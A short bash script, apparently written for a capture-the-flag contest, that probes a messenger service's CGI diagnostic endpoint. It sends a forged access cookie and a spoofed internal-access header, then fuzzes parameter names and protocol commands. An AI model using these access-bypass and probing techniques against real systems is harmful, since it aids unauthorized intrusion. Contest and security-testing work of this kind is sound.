#!/bin/bash
BASE="http://millenium-messenger.hackday.fr:8000"
COOKIE="msn_internal=granted"

echo "=== Probe CGI endpoint ==="
curl -s -i "$BASE/cgi-bin/msn_diag" -H "Cookie: $COOKIE"
echo ""

echo "=== With cmd parameter ==="
curl -s -i "$BASE/cgi-bin/msn_diag?cmd=VER" -H "Cookie: $COOKIE"
echo ""

echo "=== With various params ==="
for param in cmd command msg action input query username; do
    resp=$(curl -s "$BASE/cgi-bin/msn_diag?$param=VER" -H "Cookie: $COOKIE")
    echo "$param=VER: $resp"
done
echo ""

echo "=== POST to CGI ==="
curl -s -i -X POST "$BASE/cgi-bin/msn_diag" -H "Cookie: $COOKIE" -d "VER 1 MSNP8 CVR0"
echo ""

echo "=== CGI with X-Internal-Access ==="
curl -s -i "$BASE/cgi-bin/msn_diag" -H "X-Internal-Access: true"
echo ""

echo "=== CGI with X-Internal-Access header and params ==="
curl -s -i "$BASE/cgi-bin/msn_diag?cmd=VER%201%20MSNP8" -H "X-Internal-Access: true"
echo ""

echo "=== Try /cgi-bin/msn_diag with protocol commands ==="
for cmd in "VER" "USR" "MSG" "CAL" "status" "help"; do
    echo "--- cmd=$cmd ---"
    curl -s "$BASE/cgi-bin/msn_diag?cmd=$cmd" -H "X-Internal-Access: true" -H "Cookie: $COOKIE"
    echo ""
done
